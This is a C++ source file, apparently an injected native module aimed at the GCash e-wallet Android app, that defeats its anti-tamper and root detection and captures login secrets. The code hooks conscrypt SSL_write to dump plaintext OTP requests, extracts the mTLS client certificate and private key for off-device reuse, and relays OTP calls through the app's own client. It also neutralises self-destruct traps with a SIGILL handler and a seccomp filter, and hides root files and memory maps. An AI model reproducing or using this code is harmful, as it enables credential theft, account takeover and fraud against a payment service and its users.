// anti-hook stack-walk can't see a native inline hook on a libart JNI function). CallStaticVoidMethod
// (varargs) internally calls the V function, so hooking V+A covers all three forms. Gated
// persist.kpmhook.unpack.gcashenf, DEFAULT ON.
static const char *kQd2Sig =
    "(Ljava/lang/String;Ljava/lang/String;ZZZLjava/lang/String;Ljava/lang/String;Ljava/lang/String;)V";
static jmethodID g_gc_qd2qu3_mid = nullptr;
static std::atomic<int> g_gc_enf_probes{0};
void (*g_gc_orig_csvmv)(JNIEnv *, jclass, jmethodID, va_list) = nullptr;
void (*g_gc_orig_csvma)(JNIEnv *, jclass, jmethodID, const jvalue *) = nullptr;
static bool gc_call_is_qd2qu3(JNIEnv *env, jclass clazz, jmethodID mid) {
    if (g_gc_qd2qu3_mid) return mid == g_gc_qd2qu3_mid;                 // fast path once resolved
    if (!clazz || g_gc_enf_probes.fetch_add(1) > 50000) return false;  // bound the probe churn
    jmethodID q = env->GetStaticMethodID(clazz, "qD2qU3", kQd2Sig);
    if (env->ExceptionCheck()) env->ExceptionClear();                  // NoSuchMethodError on other classes
    if (q && q == mid) {
        g_gc_qd2qu3_mid = mid;
        LOGI("[gcashenf] qD2qU3 resolved mid={} -- enforcement dispatch will be dropped", (void *)mid);
        return true;
    }
    return false;
}
extern "C" void GcashCSVMV(JNIEnv *env, jclass clazz, jmethodID mid, va_list args) {
    if (gc_call_is_qd2qu3(env, clazz, mid)) {
        static std::atomic<int> n{0};
        if (n.fetch_add(1) < 20) LOGI("[gcashenf] DROP qD2qU3 enforcement (V)");
        return;
    }
    if (g_gc_orig_csvmv) g_gc_orig_csvmv(env, clazz, mid, args);
}
extern "C" void GcashCSVMA(JNIEnv *env, jclass clazz, jmethodID mid, const jvalue *args) {
    if (gc_call_is_qd2qu3(env, clazz, mid)) {
        static std::atomic<int> n{0};
        if (n.fetch_add(1) < 20) LOGI("[gcashenf] DROP qD2qU3 enforcement (A)");
        return;
    }
    if (g_gc_orig_csvma) g_gc_orig_csvma(env, clazz, mid, args);
}

// [OTP CAPTURE — recon, gated OFF by default] One-shot capture of the walled login.mynt.xyz OTP request
// for the off-device hybrid decision. The app's OkHttp+Conscrypt TLS goes through SSL_write/SSL_read in
// /apex/com.android.conscrypt/lib64/libssl.so; the plaintext there = the full HTTP request (POST
// c4/v2.3/otp/{generate,verify}_code + Host + the Akamai sensor-data header + _abck cookie + WCSign body)
// and the response. Traceless (KPM inline hook on conscrypt libssl — Appdome does not CRC conscrypt).
// Filtered to OTP traffic only. Gated persist.kpmhook.unpack.gcashsslcap, DEFAULT OFF.
static bool gc_buf_has(const char *b, int n, const char *pat) {
    int pl = 0; while (pat[pl]) pl++;
    if (n < pl) return false;
    for (int i = 0; i + pl <= n; i++) { int k = 0; while (k < pl && b[i + k] == pat[k]) k++; if (k == pl) return true; }
    return false;
}
static void gc_log_blob(const char *tag, const char *b, int n) {
    if (n > 32768) n = 32768;                       // cap (Akamai sensor blob can be several KB)
    char line[801];
    for (int off = 0; off < n; off += 800) {
        int c = n - off; if (c > 800) c = 800;
        memcpy(line, b + off, c); line[c] = 0;
        LOGI("[gcashssl] {} >> {}", tag, line);
    }
}
// Hook ONLY SSL_write (the request). SSL_read lives in the SAME 4KB page as SSL_write, and a second
// kpm_inline_hooker region-clone on the same page conflicts → SIGSEGV loop (device-confirmed 2026-09-29);
// the request alone carries the Akamai sensor + cookie + WCSign body we need. Return type is int (BoringSSL
// SSL_write returns int) — a long return mismatches the ABI.
static void gc_dump_ssl_creds(void *ssl);   // fwd: defined in the MTLS cert-capture block below
int (*g_gc_orig_sslwrite)(void *, const void *, int) = nullptr;
extern "C" int GcashSSLWriteHook(void *ssl, const void *buf, int num) {
    if (buf && num > 8 && num < 2000000) {
        const char *p = (const char *) buf;
        if (p[0] == 'P' && p[1] == 'O' && p[2] == 'S' && p[3] == 'T' && gc_buf_has(p, num, "/otp/")) {
            LOGI("[gcashssl] === SSL_write OTP request ({} bytes) ===", num);
            gc_log_blob("REQ", p, num);
            gc_dump_ssl_creds(ssl);   // this SSL is the live login.mynt.xyz conn -> pull its mTLS cert+key
        }
    }
    return g_gc_orig_sslwrite ? g_gc_orig_sslwrite(ssl, buf, num) : num;
}

// [MTLS CERT CAPTURE — for TRUE off-device] Capture the client cert + private key conscrypt presents in the
// login.mynt.xyz mTLS handshake, so it can be reused off-device (goal: eliminate the device relay entirely).
// The cert/key are installed into the conscrypt SSL via BoringSSL SSL_set_chain_and_key (modern) or
// SSL_use_certificate + SSL_use_PrivateKey (legacy). We i2d them to DER and hex-dump to logcat. If the key
// is an opaque privkey_method (Android Keystore-backed, NON-exportable) SSL_set_chain_and_key passes pkey=NULL
// -> we log that verdict (off-device reuse impossible via this route). p12-sourced software key => exportable.
// Dobby on apex conscrypt libssl/libcrypto (not Appdome-CRC'd). Gated persist.kpmhook.unpack.gcashcertcap.
static int (*g_i2d_X509)(void *, unsigned char **) = nullptr;
static int (*g_i2d_PrivateKey)(void *, unsigned char **) = nullptr;
static const unsigned char *(*g_cbuf_data)(void *) = nullptr;
static size_t (*g_cbuf_len)(void *) = nullptr;
static void *(*g_SSL_get_certificate)(void *) = nullptr;   // X509* SSL_get_certificate(SSL*)
static void *(*g_SSL_get_privatekey)(void *) = nullptr;    // EVP_PKEY* SSL_get_privatekey(SSL*)
static std::atomic<bool> g_cert_dumped{false};
static void gc_dump_hex(const char *tag, const unsigned char *d, int len) {
    if (!d || len <= 0 || len > 200000) return;
    static const char H[] = "0123456789abcdef";
    char line[1601];
    for (int off = 0; off < len; off += 800) {
        int c = len - off; if (c > 800) c = 800;
        for (int i = 0; i < c; i++) { line[i * 2] = H[(d[off + i] >> 4) & 0xf]; line[i * 2 + 1] = H[d[off + i] & 0xf]; }
        line[c * 2] = 0;
        LOGI("[gcashcert] {} {}", tag, line);
    }
}
static void gc_dump_x509(void *x) {
    if (!x || !g_i2d_X509) return;
    int len = g_i2d_X509(x, nullptr);
    if (len <= 0) return;
    unsigned char *buf = (unsigned char *) malloc(len);
    if (!buf) return;
    unsigned char *p = buf; g_i2d_X509(x, &p);
    LOGI("[gcashcert] === CERT der={} bytes (hex below) ===", len);
    gc_dump_hex("CERT", buf, len);
    free(buf);
}
static void gc_dump_pkey(void *pk) {
    if (!pk) { LOGW("[gcashcert] pkey=NULL -> opaque privkey_method (NON-EXPORTABLE keystore key)"); return; }
    if (!g_i2d_PrivateKey) { LOGW("[gcashcert] i2d_PrivateKey unresolved"); return; }
    int len = g_i2d_PrivateKey(pk, nullptr);
    if (len <= 0) { LOGW("[gcashcert] i2d_PrivateKey len<=0 -> non-exportable key"); return; }
    unsigned char *buf = (unsigned char *) malloc(len);
    if (!buf) return;
    unsigned char *p = buf; g_i2d_PrivateKey(pk, &p);
    LOGI("[gcashcert] === KEY der={} bytes (PKCS8, hex below) ===", len);
    gc_dump_hex("KEY", buf, len);
    free(buf);
}
// Pull the client cert+key straight off a live SSL* (works no matter HOW conscrypt installed them:
// SSL_set_chain_and_key / cert_cb / credential — SSL_get_certificate/privatekey read the resolved slot).
static void gc_dump_ssl_creds(void *ssl) {
    if (g_cert_dumped.exchange(true)) return;                  // once is enough
    if (!ssl || !g_SSL_get_certificate) { LOGW("[gcashcert] no ssl / SSL_get_certificate unresolved"); return; }
    void *x = g_SSL_get_certificate(ssl);
    void *pk = g_SSL_get_privatekey ? g_SSL_get_privatekey(ssl) : nullptr;
    LOGI("[gcashcert] from SSL* {}: cert={} pkey={}", ssl, x ? 1 : 0, pk ? 1 : 0);
    if (x) gc_dump_x509(x); else { LOGW("[gcashcert] SSL_get_certificate=NULL (client cert not on this SSL — non-conscrypt stack?)"); g_cert_dumped.store(false); }
    if (pk) gc_dump_pkey(pk); else LOGW("[gcashcert] SSL_get_privatekey=NULL (opaque/keystore key or not on this SSL)");
}
int (*g_orig_use_cert)(void *, void *) = nullptr;
extern "C" int GcSSLUseCert(void *ssl, void *x509) {
    LOGI("[gcashcert] SSL_use_certificate fired"); gc_dump_x509(x509);
    return g_orig_use_cert ? g_orig_use_cert(ssl, x509) : 1;
}
int (*g_orig_use_pkey)(void *, void *) = nullptr;
extern "C" int GcSSLUsePkey(void *ssl, void *pkey) {
    LOGI("[gcashcert] SSL_use_PrivateKey fired"); gc_dump_pkey(pkey);
    return g_orig_use_pkey ? g_orig_use_pkey(ssl, pkey) : 1;
}
int (*g_orig_chain_key)(void *, void *const *, size_t, void *, const void *) = nullptr;
extern "C" int GcSSLChainKey(void *ssl, void *const *certs, size_t num, void *pkey, const void *method) {
    LOGI("[gcashcert] SSL_set_chain_and_key fired num_certs={} pkey={} method={}", (int) num, pkey ? 1 : 0, method ? 1 : 0);
    if (certs && g_cbuf_data && g_cbuf_len)
        for (size_t i = 0; i < num && i < 4; i++) {
            const unsigned char *d = g_cbuf_data(certs[i]); int l = (int) g_cbuf_len(certs[i]);
            LOGI("[gcashcert] === CHAINCERT[{}] der={} bytes ===", (int) i, l);
            gc_dump_hex("CERT", d, l);
        }
    gc_dump_pkey(pkey);
    return g_orig_chain_key ? g_orig_chain_key(ssl, certs, num, pkey, method) : 1;
}

// [OTP RELAY / P1 CHANNEL PROBE] In-process POST to the walled login.mynt.xyz OTP endpoint through the
// app's OWN networking stack — NetworkHelper.getLoginOkHttpBuilder() is the exact bare client
// createEncrypted() uses (no custom sslSocketFactory => default = the native-installed global mTLS
// SSLContext + Android BoringSSL JA3; getConfigInterceptors() is empty => no Akamai Java interceptor to
// miss). So this RIDES whatever satisfies Akamai+mTLS without needing to reproduce it, and it bypasses the
// fragile OTP UI (APSE-on-main-thread ANR). Body = off-device-built WCSign from
// /data/local/tmp/otp_relay_req.json (R1 relay), else a placeholder (P1 channel probe). Signal in logcat:
//   HTTP 4xx (WCSign-invalid / OT* biz error) or 200            => Akamai+mTLS PASSED, channel works (R1 OK)
//   execute() throws SSLHandshake CERTIFICATE_REQUIRED / 403 #51 => wall blocked (need R2 / investigate)
// Runs on a detached native thread => resolve app classes via ActivityThread.currentApplication()'s
// ClassLoader (a fresh native thread's FindClass only sees the boot loader). Gated
// persist.kpmhook.unpack.gcashotp, DEFAULT OFF. Fire once app is stable: setprop persist.kpmhook.unpack.otpfire 1.
static bool gc_read_file(const char *path, std::string &out) {
    FILE *f = fopen(path, "rb");
    if (!f) return false;
    char b[4096]; size_t n;
    while ((n = fread(b, 1, sizeof b, f)) > 0) out.append(b, n);
    fclose(f);
    return !out.empty();
}
static bool gc_exc(JNIEnv *env, const char *where) {
    if (!env->ExceptionCheck()) return false;
    jthrowable ex = env->ExceptionOccurred();
    env->ExceptionClear();
    if (ex) {
        jclass ct = env->GetObjectClass(ex);
        jmethodID ts = env->GetMethodID(ct, "toString", "()Ljava/lang/String;");
        jstring js = ts ? (jstring) env->CallObjectMethod(ex, ts) : nullptr;
        if (js) { const char *cs = env->GetStringUTFChars(js, nullptr);
                  LOGW("[gcashotp] EXCEPTION @{}: {}", where, cs ? cs : "?");
                  if (cs) env->ReleaseStringUTFChars(js, cs); }
        else { env->ExceptionClear(); LOGW("[gcashotp] EXCEPTION @{} (no toString)", where); }
    } else LOGW("[gcashotp] pending exception @{}", where);
    return true;
}
void GcOtpRelayCall(JNIEnv *env, const char *url, const std::string &body) {
    jclass cAT = env->FindClass("android/app/ActivityThread");
    if (gc_exc(env, "FindClass ActivityThread") || !cAT) return;
    jmethodID mCur = env->GetStaticMethodID(cAT, "currentApplication", "()Landroid/app/Application;");
    jobject app = mCur ? env->CallStaticObjectMethod(cAT, mCur) : nullptr;
    if (gc_exc(env, "currentApplication") || !app) { LOGW("[gcashotp] no Application"); return; }
    jclass cCtx = env->FindClass("android/content/Context");
    jmethodID mGCl = env->GetMethodID(cCtx, "getClassLoader", "()Ljava/lang/ClassLoader;");
    jobject loader = env->CallObjectMethod(app, mGCl);
    if (gc_exc(env, "getClassLoader") || !loader) return;
    jclass cCL = env->FindClass("java/lang/ClassLoader");
    jmethodID mLoad = env->GetMethodID(cCL, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    auto load = [&](const char *name) -> jclass {
        jstring jn = env->NewStringUTF(name);
        jclass c = (jclass) env->CallObjectMethod(loader, mLoad, jn);
        env->DeleteLocalRef(jn);
        if (gc_exc(env, name)) return nullptr;
        return c;
    };
    jclass cNH = load("gcash.common.android.network.NetworkHelper");
    if (!cNH) return;
    jmethodID mGB = env->GetStaticMethodID(cNH, "getLoginOkHttpBuilder", "()Lokhttp3/OkHttpClient$Builder;");
    if (gc_exc(env, "getLoginOkHttpBuilder id") || !mGB) return;
    jobject builder = env->CallStaticObjectMethod(cNH, mGB);
    if (gc_exc(env, "getLoginOkHttpBuilder()") || !builder) return;
    jmethodID mBuild = env->GetMethodID(env->GetObjectClass(builder), "build", "()Lokhttp3/OkHttpClient;");
    jobject client = mBuild ? env->CallObjectMethod(builder, mBuild) : nullptr;
    if (gc_exc(env, "builder.build") || !client) return;
    jclass cMT = load("okhttp3.MediaType");
    if (!cMT) return;
    jmethodID mParse = env->GetStaticMethodID(cMT, "parse", "(Ljava/lang/String;)Lokhttp3/MediaType;");
    if (gc_exc(env, "MediaType.parse id") || !mParse) return;
    jstring jct = env->NewStringUTF("application/json; charset=utf-8");
    jobject mt = env->CallStaticObjectMethod(cMT, mParse, jct);
    if (gc_exc(env, "MediaType.parse()")) return;
    jclass cRB = load("okhttp3.RequestBody");
    if (!cRB) return;
    jstring jbody = env->NewStringUTF(body.c_str());
    jmethodID mCreate = env->GetStaticMethodID(cRB, "create", "(Lokhttp3/MediaType;Ljava/lang/String;)Lokhttp3/RequestBody;");
    jobject rb = nullptr;
    if (mCreate) rb = env->CallStaticObjectMethod(cRB, mCreate, mt, jbody);
    if (!rb) {
        env->ExceptionClear();
        jmethodID mCreate2 = env->GetStaticMethodID(cRB, "create", "(Ljava/lang/String;Lokhttp3/MediaType;)Lokhttp3/RequestBody;");
        if (mCreate2) rb = env->CallStaticObjectMethod(cRB, mCreate2, jbody, mt);
    }
    if (gc_exc(env, "RequestBody.create") || !rb) { LOGW("[gcashotp] RequestBody.create failed"); return; }
    jclass cReqB = load("okhttp3.Request$Builder");
    if (!cReqB) return;
    jmethodID mReqInit = env->GetMethodID(cReqB, "<init>", "()V");
    jobject reqb = env->NewObject(cReqB, mReqInit);
    if (gc_exc(env, "new Request.Builder") || !reqb) return;
    jmethodID mUrl = env->GetMethodID(cReqB, "url", "(Ljava/lang/String;)Lokhttp3/Request$Builder;");
    jstring jurl = env->NewStringUTF(url);
    env->CallObjectMethod(reqb, mUrl, jurl);
    if (gc_exc(env, "url")) return;
    jmethodID mPost = env->GetMethodID(cReqB, "post", "(Lokhttp3/RequestBody;)Lokhttp3/Request$Builder;");
    env->CallObjectMethod(reqb, mPost, rb);
    if (gc_exc(env, "post")) return;
    jmethodID mReqBuild = env->GetMethodID(cReqB, "build", "()Lokhttp3/Request;");
    jobject request = env->CallObjectMethod(reqb, mReqBuild);
    if (gc_exc(env, "request.build") || !request) return;
    jclass cClient = env->GetObjectClass(client);
    jmethodID mNewCall = env->GetMethodID(cClient, "newCall", "(Lokhttp3/Request;)Lokhttp3/Call;");
    jobject call = env->CallObjectMethod(client, mNewCall, request);
    if (gc_exc(env, "newCall") || !call) return;
    jmethodID mExec = env->GetMethodID(env->GetObjectClass(call), "execute", "()Lokhttp3/Response;");
    LOGI("[gcashotp] >>> POST {} ({} body bytes) via getLoginOkHttpBuilder", url, (int) body.size());
    jobject resp = mExec ? env->CallObjectMethod(call, mExec) : nullptr;
    if (gc_exc(env, "execute")) { LOGW("[gcashotp] <<< execute threw (TLS/Akamai/conn — see EXCEPTION)"); return; }
    if (!resp) { LOGW("[gcashotp] null response"); return; }
    jclass cResp = env->GetObjectClass(resp);
    jint code = env->CallIntMethod(resp, env->GetMethodID(cResp, "code", "()I"));
    jobject respBody = env->CallObjectMethod(resp, env->GetMethodID(cResp, "body", "()Lokhttp3/ResponseBody;"));
    std::string bodyStr;
    if (respBody) {
        jmethodID mStr = env->GetMethodID(env->GetObjectClass(respBody), "string", "()Ljava/lang/String;");
        jstring js = mStr ? (jstring) env->CallObjectMethod(respBody, mStr) : nullptr;
        if (!gc_exc(env, "body.string") && js) {
            const char *cs = env->GetStringUTFChars(js, nullptr);
            if (cs) { bodyStr.assign(cs); env->ReleaseStringUTFChars(js, cs); }
        }
    }
    LOGI("[gcashotp] <<< HTTP {} bodylen={}", (int) code, (int) bodyStr.size());
    for (size_t off = 0; off < bodyStr.size() && off < 8192; off += 800)
        LOGI("[gcashotp] BODY >> {}", bodyStr.substr(off, 800).c_str());
}

// [CONFIG DECRYPT] Resolve a native config host the app hides behind BCipher (e.g. REGISTRATION_DOMAIN,
// LOGIN_ROUTE_BASE_URL). The app's own resolver = ConNative.Companion.getValue(key) (encrypted) ->
// BCipher.getInstance().decrypt(...) (see ServiceModule.E4 / GConfig getDomainV5). We call the exact same
// pair via JNI on the app classloader -> the plaintext host, no off-device BCipher key reversal needed.
// Trigger: setprop persist.kpmhook.unpack.cfgkey <KEY> then otpfire 1 (decrypt-only, skips the POST).
static jobject gc_app_classloader(JNIEnv *env) {
    jclass cAT = env->FindClass("android/app/ActivityThread");
    if (gc_exc(env, "FindClass ActivityThread") || !cAT) return nullptr;
    jmethodID mCur = env->GetStaticMethodID(cAT, "currentApplication", "()Landroid/app/Application;");
    jobject app = mCur ? env->CallStaticObjectMethod(cAT, mCur) : nullptr;
    if (gc_exc(env, "currentApplication") || !app) return nullptr;
    jclass cCtx = env->FindClass("android/content/Context");
    jmethodID mGCl = env->GetMethodID(cCtx, "getClassLoader", "()Ljava/lang/ClassLoader;");
    jobject loader = env->CallObjectMethod(app, mGCl);
    if (gc_exc(env, "getClassLoader")) return nullptr;
    return loader;
}
static jclass gc_load(JNIEnv *env, jobject loader, const char *name) {
    jclass cCL = env->FindClass("java/lang/ClassLoader");
    jmethodID mLoad = env->GetMethodID(cCL, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
    jstring jn = env->NewStringUTF(name);
    jclass c = (jclass) env->CallObjectMethod(loader, mLoad, jn);
    env->DeleteLocalRef(jn);
    if (gc_exc(env, name)) return nullptr;
    return c;
}
void GcConfigDecrypt(JNIEnv *env, const char *key) {
    jobject loader = gc_app_classloader(env);
    if (!loader) { LOGW("[gcashcfg] no app classloader"); return; }
    jclass cCN = gc_load(env, loader, "gcash.module.module_native.ConNative");
    if (!cCN) return;
    jfieldID fComp = env->GetStaticFieldID(cCN, "Companion", "Lgcash/module/module_native/ConNative$Companion;");
    jobject comp = fComp ? env->GetStaticObjectField(cCN, fComp) : nullptr;
    if (gc_exc(env, "ConNative.Companion") || !comp) { LOGW("[gcashcfg] no ConNative.Companion"); return; }
    jmethodID mGV = env->GetMethodID(env->GetObjectClass(comp), "getValue", "(Ljava/lang/String;)Ljava/lang/String;");
    jstring jk = env->NewStringUTF(key);
    jstring enc = mGV ? (jstring) env->CallObjectMethod(comp, mGV, jk) : nullptr;
    if (gc_exc(env, "getValue") || !enc) { LOGW("[gcashcfg] getValue({}) null", key); return; }
    const char *ec = env->GetStringUTFChars(enc, nullptr);
    LOGI("[gcashcfg] {} ENC = {}", key, ec ? ec : "?");
    if (ec) env->ReleaseStringUTFChars(enc, ec);
    jclass cBC = gc_load(env, loader, "com.dotx.cipherkey.BCipher");
    if (!cBC) return;
    jmethodID mGI = env->GetStaticMethodID(cBC, "getInstance", "()Lcom/dotx/cipherkey/ICipher;");
    jobject cipher = mGI ? env->CallStaticObjectMethod(cBC, mGI) : nullptr;
    if (gc_exc(env, "BCipher.getInstance") || !cipher) { LOGW("[gcashcfg] no BCipher instance"); return; }
    jmethodID mDec = env->GetMethodID(env->GetObjectClass(cipher), "decrypt", "(Ljava/lang/String;)Ljava/lang/String;");
    jstring dec = mDec ? (jstring) env->CallObjectMethod(cipher, mDec, enc) : nullptr;
    if (gc_exc(env, "decrypt") || !dec) { LOGW("[gcashcfg] decrypt null"); return; }
    const char *cs = env->GetStringUTFChars(dec, nullptr);
    LOGI("[gcashcfg] {} = {}", key, cs ? cs : "?");
    if (cs) env->ReleaseStringUTFChars(dec, cs);
}

// [self-destruct catch] Appdome's fuse-blown enforcement executes `udf #0` (SIGILL) INSIDE libloader
// to self-kill (RE: inline __udf(0)/sub_AB644, gated by the master-gate flag dword_9422D4&0x100000).
// We do NOT run frida's gum-exceptor, so these traps terminate the process (Zygote "exited due to
// signal 4"; observed at ~63s once ADB spoof delayed the fuse). Install a SIGILL handler that, when the
// faulting PC is inside libloader AND the instruction is `udf #0` (0x00000000), skips it (pc += 4) so
// the self-destruct no-ops and the checkpoint returns as if the verdict were clean. Real SIGILLs
// elsewhere chain to the previous handler. NOTE: installing a handler for a signal Appdome ALREADY
// catches (it catches SIGILL for its own self-destruct) does NOT change /proc/self/status SigCgt, so
// the SigCgt anti-hook check is unaffected. Gated persist.kpmhook.unpack.gcashudfcatch, DEFAULT ON.
static struct sigaction g_gc_old_ill;
static std::atomic<uintptr_t> g_gc_ll_lo{0};
static std::atomic<uintptr_t> g_gc_ll_hi{0};
static std::atomic<long> g_gc_udf_skips{0};
static std::atomic<bool> g_gc_ill_captured{false};
static void GcUdfCatch(int sig, siginfo_t *si, void *uc_v) {
    ucontext_t *uc = reinterpret_cast<ucontext_t *>(uc_v);
#if defined(__aarch64__)
    // arm64 only: the Appdome enforcement lives in the arm64 libloader (`udf #0` = 0x00000000).
    uintptr_t pc = static_cast<uintptr_t>(uc->uc_mcontext.pc);
    uintptr_t lo = g_gc_ll_lo.load(), hi = g_gc_ll_hi.load();
    if (lo && pc >= lo && pc < hi && (pc & 3) == 0) {
        uint32_t insn = *reinterpret_cast<volatile uint32_t *>(pc);   // pc is r-x, safe to read
        if (insn == 0x00000000u) {            // AArch64 `udf #0`
            uc->uc_mcontext.pc = pc + 4;      // skip the self-destruct trap
            long n = g_gc_udf_skips.fetch_add(1) + 1;
            if (n <= 8) LOGW("[gcashudf] skipped udf#0 @ {:x} (libloader self-destruct) count={}", (unsigned long) pc, n);
            return;
        }
    }
#endif
    // real SIGILL elsewhere -> chain to the captured previous handler (or default)
    if ((g_gc_old_ill.sa_flags & SA_SIGINFO) && g_gc_old_ill.sa_sigaction) {
        g_gc_old_ill.sa_sigaction(sig, si, uc_v);
    } else if (g_gc_old_ill.sa_handler && g_gc_old_ill.sa_handler != SIG_DFL &&
               g_gc_old_ill.sa_handler != SIG_IGN) {
        g_gc_old_ill.sa_handler(sig);
    } else {
        signal(sig, SIG_DFL);
        raise(sig);
    }
}

// ROOT-FILE hide at libloader's OWN static-libc syscall stubs. libloader's periodic monitor raw-
// syscalls newfstatat(79)/openat(56) via ITS OWN static libc -> bypasses the app-libc GcashFstatatHook/
// GcashFaccessatHook entirely (that is why hiding root files there never helped). RE + gcash_filetrace
// (2026-09-24, hidetracer armed) proved: nr=79 stats /su/bin/su../system/bin/su.. and ONLY
// /system/bin/su exists (= APatch's su, `which su`) -> root detected -> ~15-18s exit_group self-kill.
// Traceless-hook the libloader stubs: return -1 ("not found", the value libloader's existence checks
// handle as clean) for root paths, else call the original stub. .text stays byte-identical (KPM region
// clone) -> BC-SHA integrity hash sees no tamper. (Kernel shpte openhide would be cleaner + cover ALL
// callers, but the embedded shpte can't be runtime-updated on this device: APatch "embedded KPMs cannot
// be unloaded"; shctl superkey dead.) Offsets from libloader_decrypted.so: sub_34C154=syscall(79),
// sub_34C084=syscall(56).
long (*g_gc_orig_ldstat)(long, const char *, void *, long) = nullptr;
extern "C" long GcashLoaderStatHook(long dirfd, const char *path, void *buf, long flags) {
    if (path && GcIsRootPath(path)) { LOGI("[gcashstat] HIDE newfstatat({})", path); return -1; }
    return g_gc_orig_ldstat ? g_gc_orig_ldstat(dirfd, path, buf, flags) : -1;
}
long (*g_gc_orig_ldopen)(long, const char *, long, long) = nullptr;
extern "C" long GcashLoaderOpenHook(long dirfd, const char *path, long flags, long mode) {
    if (path && GcIsRootPath(path)) { LOGI("[gcashstat] HIDE openat({})", path); return -1; }
    return g_gc_orig_ldopen ? g_gc_orig_ldopen(dirfd, path, flags, mode) : -1;
}

// Threat-registration OBSERVER (passthrough, does NOT alter libloader behavior -> no crash).
// sub_44ABD4 (libloader+0x44ABD4) is the only place threats get added to the action list
// (qword_9B5BA8/9B5BA0) that sub_44CC30 later acts on to self-exit. Its arg is a 48-byte threat
// struct built by sub_45EAD0: 8-byte string handles at +0/+8/+24/+32/+40 and a bool at +16. Log those
// strings then call the original so the threat is still added -> we learn WHICH detection fired without
// changing the outcome. Gated by persist.kpmhook.unpack.gcashthreatlog (default OFF, opt-in for RE).
static void *g_gc_orig_addthreat = nullptr;
static void gc_dump_str(const char *tag, unsigned long v) {
    if (v < 0x1000000000UL || v > 0x8000000000UL) { LOGI("[gcashthreat] {} = {:#x} (not-ptr)", tag, v); return; }
    const unsigned char *p = reinterpret_cast<const unsigned char *>(v);
    char hex[100]; int n = 0; char asc[49]; int m = 0;
    for (int i = 0; i < 48; i++) {
        unsigned char c = p[i];
        n += snprintf(hex + n, sizeof(hex) - n, "%02x", c);
        asc[m++] = (c >= 32 && c < 127) ? (char)c : '.';
    }
    asc[m] = 0;
    LOGI("[gcashthreat] {} @{:#x}: {} |{}|", tag, v, hex, asc);
}
extern "C" void *GcashAddThreatLog(void *t) {
    if (t) {
        unsigned long *q = reinterpret_cast<unsigned long *>(t);
        LOGI("[gcashthreat] === threat added, struct@{} raw {:#x} {:#x} {:#x} {:#x} {:#x} {:#x} ===",
             t, q[0], q[1], q[2], q[3], q[4], q[5]);
        gc_dump_str("f0", q[0]); gc_dump_str("f1", q[1]);
        gc_dump_str("f3", q[3]); gc_dump_str("f4", q[4]); gc_dump_str("f5", q[5]);
    }
    return g_gc_orig_addthreat ? reinterpret_cast<void *(*)(void *)>(g_gc_orig_addthreat)(t) : nullptr;
}

// config-map CHECK observers (passthrough). sub_F4A30(key,type)=count entries under key; sub_F4A04
// (key,type)=bool. In sub_45E264 these drive dword_9B7614 + the byte flags -> the 18s self-exit. Log
// the key ONLY when the result is non-zero (= a threat/detection is present) -> low-noise pinpoint of
// which detection actually fires. Passthrough (call original) -> libloader logic intact, no crash.
static void *g_gc_orig_f4a30 = nullptr, *g_gc_orig_f4a04 = nullptr;
extern "C" long GcashF4a30Log(void *key, long type) {
    long r = g_gc_orig_f4a30 ? reinterpret_cast<long (*)(void *, long)>(g_gc_orig_f4a30)(key, type) : 0;
    if (r != 0) { LOGI("[gcashchk] COUNT type={} -> {} key:", type, r); gc_dump_str("  key", (unsigned long)key); }
    return r;
}
extern "C" long GcashF4a04Log(void *key, long type) {
    long r = g_gc_orig_f4a04 ? reinterpret_cast<long (*)(void *, long)>(g_gc_orig_f4a04)(key, type) : 0;
    if ((r & 1) != 0) { LOGI("[gcashchk] BOOL type={} -> TRUE key:", type); gc_dump_str("  key", (unsigned long)key); }
    return r;
}

// seccomp: kernel BPF filter blocking the RASP's inline-svc self-kill (exit_group + lethal
// kill/tgkill). Syscall-level -> catches the inline svc that libc-function hooks miss; modifies NO
// .text -> libloader's self-CRC stays clean (unlike svc-instrument). TSYNC applies it to ALL
// threads (incl. the RASP detection threads). exit(93) stays allowed so a detection THREAD can
// exit while the PROCESS survives.
void InstallGcashSeccomp() {
    struct sock_filter f[] = {
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, nr)),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 94, 11, 0),  // exit_group -> BLOCK(13)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 129, 2, 0),  // kill       -> CHK_KILL(5)
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 131, 5, 0),  // tgkill     -> CHK_TG(9)
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, args[1])),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 9, 6, 0),  // SIGKILL -> BLOCK
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 6, 5, 0),  // SIGABRT -> BLOCK
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS, offsetof(struct seccomp_data, args[2])),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 9, 2, 0),
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, 6, 1, 0),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ERRNO | (EPERM & SECCOMP_RET_DATA)),
    };
    struct sock_fprog prog = {(unsigned short)(sizeof(f) / sizeof(f[0])), f};
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);  // required for an unprivileged filter
    long r = syscall(__NR_seccomp, SECCOMP_SET_MODE_FILTER, SECCOMP_FILTER_FLAG_TSYNC, &prog);
    if (r == 0)
        LOGI("[gcashfix] seccomp installed (TSYNC all-threads): block exit_group + lethal kill/tgkill");
    else
        LOGW("[gcashfix] seccomp(TSYNC) failed: {}", strerror(errno));
}

// Hide every injected/anomalous maps region so libloader's /proc/self/maps blocklist scan finds
// nothing. Kernel mm-gated (kpm_hide_region) -> defeats the scan no matter how it reads maps, and
// leaves all code byte-identical (self-CRC clean). Repeated a few rounds: new trampolines/clones
// and the module .so may map at slightly different times during startup.
void RunGcashNeutralize(JavaVM *vm, unsigned long off) {
    (void)off;
    g_gc_vm = vm;  // for GcDumpJavaStack (proof of what code drives the close)
    // Install the hooks ASAP -- root/tamper detection fires very early (OneApp exits ~10s). Only a
